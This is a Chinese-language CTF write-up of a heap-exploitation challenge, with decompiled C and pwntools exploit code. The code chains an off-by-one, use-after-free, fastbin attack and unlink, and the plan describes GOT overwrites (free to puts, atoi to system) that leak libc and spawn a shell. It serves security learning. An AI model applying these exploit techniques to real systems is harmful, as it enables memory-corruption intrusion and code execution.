
## 漏洞分析

`v10 = sub_400A36(&unk_603110, 5uLL);`函数内容见上文，可以看到读入5个字节，但是`unk_603110`是用4个字节存储，如果我们读入5个字节，最后一个字节就会溢出到`dword_603114`变量，造成off by one漏洞，而`dword_603114`这个变量其实就是case2 bender机器人的申请记录，我们可以通过off by one篡改。

ps:这些变量名都对应其地址

![](upload/attach/202603/1002337_53NFZHKXCD37C7X.png)

### 功能2

看功能2，这里就是回收六个内存的功能，注意到六个内存在`free`之后并没有设置为`null`，而且内存大小也没设置为`0`，但是申请记录变量有设为`0`，而回看刚才的功能1，每个内存在申请时都会检测申请记录，如果我们能够修改这个值（比如利用off by one）就可以造成use after free漏洞。

```c
__int64 sub_40120C()
{
  __int64 result; // rax
  sub_400D83("Which robot do you want to remove from the wheel?");
  printf("Your choice :");
  memset(&unk_603110, 0, 4uLL);
  result = (unsigned int)sub_400A36(&unk_603110, 4uLL);
  switch ( (int)result )
  {
  case 1:
    result = (unsigned int)dword_603120;
    if ( dword_603120 )
    {
      free(buf);
      dword_603120 = 0;
      result = --qword_603130;
    }
    break;
  case 2:
    result = (unsigned int)dword_603114;
    if ( dword_603114 )
    {
      free(qword_6030F0);
      dword_603114 = 0;
      result = --qword_603130;
    }
    break;
  case 3:
    result = (unsigned int)dword_603124;
    if ( dword_603124 )
    {
      free(qword_603100);
      dword_603124 = 0;
      result = --qword_603130;
    }
    break;
  case 4:
    result = (unsigned int)dword_603118;
    if ( dword_603118 )
    {
      free(qword_6030E0);
      dword_603118 = 0;
      result = --qword_603130;
    }
    break;
  case 5:
    result = (unsigned int)dword_603128;
    if ( dword_603128 )
    {
      free(qword_603108);
      dword_603128 = 0;
      result = --qword_603130;
    }
    break;
  case 6:
    result = (unsigned int)dword_60311C;
    if ( dword_60311C )
    {
      free(qword_6030E8);
      dword_60311C = 0;
      result = --qword_603130;
    }
    break;
  default:
    return result;
  }
  return result;
}
```

### 功能3

看功能3，就是往申请的内存里写内容，会检查内存是否已申请。

```c
ssize_t sub_4013E0()
{
  ssize_t result; // rax
  sub_400D83("Which robot's name do you want to change?");
  printf("Your choice :");
  memset(&unk_603110, 0, 4uLL);
  result = (unsigned int)sub_400A36(&unk_603110, 4uLL);
  switch ( (int)result )
  {
  case 1:
    result = (unsigned int)dword_603120;
    if ( dword_603120 )
    {
      puts("Robot's name: ");
      result = read(0, buf, 0x14uLL);
    }
    break;
  case 2:
    result = (unsigned int)dword_603114;
    if ( dword_603114 )
    {
      puts("Robot's name: ");
      result = read(0, qword_6030F0, 20 * qword_603138);
    }
    break;
  case 3:
    result = (unsigned int)dword_603124;
    if ( dword_603124 )
    {
      puts("Robot's name: ");
      result = read(0, qword_603100, 20 * qword_603140);
    }
    break;
  case 4:
    result = (unsigned int)dword_603118;
    if ( dword_603118 )
    {
      puts("Robot's name: ");
      result = read(0, qword_6030E0, 0xFA0uLL);
    }
    break;
  case 5:
    result = (unsigned int)dword_603128;
    if ( dword_603128 )
    {
      puts("Robot's name: ");
      result = read(0, qword_603108, 0x9C40uLL);
    }
    break;
  case 6:
    result = (unsigned int)dword_60311C;
    if ( dword_60311C )
    {
      puts("Robot's name: ");
      result = read(0, qword_6030E8, 20 * qword_603148);
    }
    break;
  default:
    return result;
  }
  return result;
}
```

### 功能4

看功能四，其实就是打印内存内容，但是我们不能控制要打印哪个内存，因为`switch`传入的值是随机的。

```c
unsigned __int64 __fastcall sub_4015BD(__int64 a1)
{
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]
  do
    v2 = rand();
  while ( 0x80000000 - 0x80000000uLL % (a1 + 1) <= v2 );
  return v2 / (0x80000000uLL / (a1 + 1));
}

int sub_40162E()
{
  if ( (unsigned __int64)qword_603130 > 2 )
  {
    switch ( (unsigned int)sub_4015BD(6LL) )
    {
    case 1u:
      if ( !dword_603114 )
        goto LABEL_6;
      sub_400CA0(buf);
      break;
    case 2u:
LABEL_6:
      if ( !dword_603114 )
        goto LABEL_8;
      sub_400B20("Are you kidding me!!!");
      break;
    case 3u:
LABEL_8:
      if ( !dword_603124 )
        goto LABEL_10;
      sub_400CA0(qword_603100);
      break;
    case 4u:
LABEL_10:
      if ( !dword_603118 )
        goto LABEL_12;
      sub_400CA0(qword_6030E0);
      break;
    case 5u:
LABEL_12:
      if ( !dword_603128 )
        goto LABEL_14;
      sub_400CA0(qword_603108);
      break;
    case 6u:
LABEL_14:
      if ( !dword_60311C )
        goto LABEL_16;
      sub_400CA0(qword_6030E8);
      break;
    default:
LABEL_16:
      sub_400BE5(" AH AH AH Welcome in Robot Hell!! ");
      break;
    }
    exit(1);
  }
  return puts("Filling the wheel first!");
}
```

## 思路

1. 利用 off by one 漏洞和use after free和fastbin attack分配 chunk 到`0x603138`（`0x603148`记录了case6机器人的可写入长度），进而可以控制`size`的大小，从而实现任意长度堆溢出。这里我们将case2机器人Bender分配到这里

2. 分别分配合适大小的物理相邻的 chunk，其中包括case6。借助上面可以任意长度堆溢出的漏洞，对 case6 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 `0x6030E8` 处 fake chunk 进行 unlink 的效果，这时 bss 段的 case6 指向 `0x6030D0`。从而，我们可以再次实现覆盖 bss 段几乎所有的内容。

3. 构造一个任意地址写的漏洞。通过上述的漏洞将case6覆盖为`free@got`，case2覆盖为case6申请记录变量的地址，这样就能无限`free` case6了，case1指针覆盖为 case6 的地址，那么此后编辑 case1 即在编辑 case6 的内容，进而当我们再次编辑 case6时就相当于任意地址写。

4. 通过步骤四我们覆盖了case6为`free@got`，我们编辑case6的内容，就能够将`free@got`内容修改为`puts@plt`，接着我们编辑case2为`puts@got`，此时调用`free(case6)`其实就是`puts(puts@got)`泄露地址。

5. 在泄漏了相应的内容后，我们便可以得到 libc 基地址，`system` 地址。我们只要编辑case1为`atoi@got`，编辑case2为1，再`free(case6)`就能够修改`atoi@got`为 `system` 地址。这样当我们输入`"sh"`时，`atoi("sh")`就变成了`system("sh")`，执行shell。

感觉有点烧脑。。。看wp理解了好久

## 分析过程

先写下程序的交互

```python
def add(choice,size=0):
    io.recvuntil(b"Your choice : ")
    io.send(b'1')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
    if choice == 2:
        io.recvuntil(b"Increase Bender's intelligence: ")
        io.send(str(size).encode())
    elif choice == 3:
        io.recvuntil(b"Increase Robot Devil's cruelty: ")
        io.send(str(size).encode())
    elif choice == 6:
        io.recvuntil(b"Increase Destructor's powerful: ")
        io.send(str(size).encode())

def off_by_one(choice):
    io.recvuntil(b"Your choice : ")
    io.send(b'1')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())

def delete(choice):
    io.recvuntil(b"Your choice : ")
    io.send(b'2')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())

def change(choice,payload):
    io.recvuntil(b"Your choice : ")
    io.send(b'3')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
    io.recvuntil(b"Robot's name: \n")
    io.send(payload)

def start(index):
    io.recvuntil(b"Your choice : ")
    io.send(b'4')
```

```python
#case6即Destructor的指针，指向分配的内存
ptr = 0x6030E8
#case1的指针，指向分配的内存
buf = 0x6030F8
#pause()
#坑1
add(2,1)# 申请case2，size是20*1，这里好坑，calloc(1,20)分配给我们的chunk_size是0x20而不是0x30，因为这里复用了下一块chunk的pre_size部分
delete(2) # 回收case2，申请记录就变成0了，回收到fastbin，fastbin -> chunk0 -> null
```

首先申请case2，然后再回收，此时申请记录为0

![](upload/attach/202603/1002337_NRQ4TXRURESPBYB.png)

```python
off_by_one('9999'+'\x01') # 利用off_by_one漏洞，把case2的申请记录从0改成1，改了才能编辑case2内容
change(2,p64(0x603138))# 这里利用了use after free，修改chunk0的fd指针，变成fastbin -> chunk0 -> 0x603138 -> null
```

通过off by one漏洞溢出`0x603114`最低字节，并修改fd指针

![](upload/attach/202603/1002337_D6X28B9K445UN4S.png)

```python
off_by_one('9999'+'\x00') # 利用off_by_one漏洞，把case2的申请记录从1改成0，改了才能添加case2
add(1) #fastbin -> 0x603138 -> null
add(3,0x20) #我们还需要把0x603140改成0x20，为的是绕过size的检查，这个地址对应case3的size
add(2,1)# 分配0x603138的chunk给case2，就能够修改case6的写入长度了
```

把`0x603148`地址作为内存分配给case2

![](upload/attach/202603/1002337_ZAGZC2KSEVC5XFB.png)

```python
delete(1) #回收case1
delete(3) #回收case3 因为不能超过三个机器人
add(6,8) #申请case6，对应0x6030E8地址，20*8=0xa0，分配了0xb0的chunk，记chunk1
add(3,8) #申请case3，分配了0xb0的chunk，记chunk2
```

回收case1和case3，申请case6和case3

![](upload/attach/202603/1002337_UT83ZTJ6GQ27EXB.png)

```python
change(2,p64(1000)) #修改写入长度造成堆溢出
payload = p64(0)+p64(0x20) #fake chunk的presize和size
# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查
payload += p64(ptr - 0x18) # fake chunk的fd，即&case6-0x18
payload += p64(ptr - 0x10) # fake chunk的bk，即&case6-0x10
payload += p64(0x20) # 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查
payload = payload.ljust(0xa0,b'a')
payload += p64(0xa0) # chunk2的presize
payload += p64(0xb0) # chunk2的size，这里主要把inuse标志位改成0，这样free时就能触发unlink
change(6,payload) #这里利用堆溢出修改chunk1和chunk2，布置利用环境
delete(3) #触发unlink
```

编辑case2修改case6的写入长度，接着就是布置unlink环境

![](upload/attach/202603/1002337_G2DB443GEB5CK5F.png)

unlink将`0x6030E8`指向了`0x6030E8 - 0x18`
